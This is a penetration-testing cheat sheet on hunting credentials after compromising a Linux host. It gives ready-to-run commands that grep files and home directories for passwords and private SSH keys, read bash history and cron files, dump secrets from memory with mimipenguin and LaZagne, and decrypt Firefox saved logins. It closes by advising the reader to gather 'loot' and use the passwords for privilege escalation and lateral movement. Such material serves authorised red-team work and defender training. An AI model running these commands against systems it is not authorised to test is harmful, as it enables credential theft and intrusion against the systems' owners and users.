### Technique Name:

Searching for Credentials on a Compromised Linux System
### Summary:

Credentials are often scattered across various locations in a Linux environmentâ€”stored in files, memory, browser data, or keyrings. Post-exploitation credential hunting focuses on collecting these secrets to escalate privileges, pivot laterally, or maintain persistence.
### Conditions:

- You have user-level or root access on a Linux system.    
- Access to user home directories and readable system paths is essential.
### 1. Files

Various plaintext configuration files, scripts, backups, and database dumps may contain hardcoded credentials.
#### Common File Types and Paths:

```bash
find / -name "*.conf" -o -name "*.cnf" -o -name "*.config" 2>/dev/null
find / -name "*.sql" -o -name "*.db" -o -name "*.bak" 2>/dev/null
find /home/* -name "*.txt" -o -type f ! -name "*.*"
```
#### Search for Sensitive Strings:

```bash
grep -Ri "password\|username\|user\|login" /etc /home 2>/dev/null
```
#### SSH Keys:

```bash
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```
#### Cronjobs:

```bash
cat /etc/crontab
ls -la /etc/cron.* /var/spool/cron
```
### 2. History

Command-line history may expose sensitive credentials used in past commands.
#### Check Bash History:

```bash
tail -n 50 /home/*/.bash_history
```
#### Shell Initialisation Files:

```bash
cat ~/.bashrc
cat ~/.bash_profile
```
### 3. Memory

Tools like mimipenguin and LaZagne can extract credentials from memory or from disk-stored secrets.
#### Mimipenguin:

```bash
sudo ./mimipenguin.sh
# or
sudo python3 mimipenguin.py
```
#### LaZagne (Linux support):

```bash
sudo python2 laZagne.py all
```
### 4. Key-Rings & Browser Stored Credentials

Browsers like Firefox and credential managers (e.g., GNOME Keyring) store passwords that can often be decrypted if the master key is accessible.
#### Firefox:

```bash
ls ~/.mozilla/firefox/
cat ~/.mozilla/firefox/*.default-release/logins.json
```
#### Firefox Decryption:

```bash
python3 firefox_decrypt.py
```
#### LaZagne for Browsers:

```bash
python3 laZagne.py browsers
```
### Post-Exploitation:

- Export all found credentials to a loot directory.    
- Check reusability across SSH, sudo, internal applications.
- Attempt privilege escalation or lateral movement with discovered passwords.
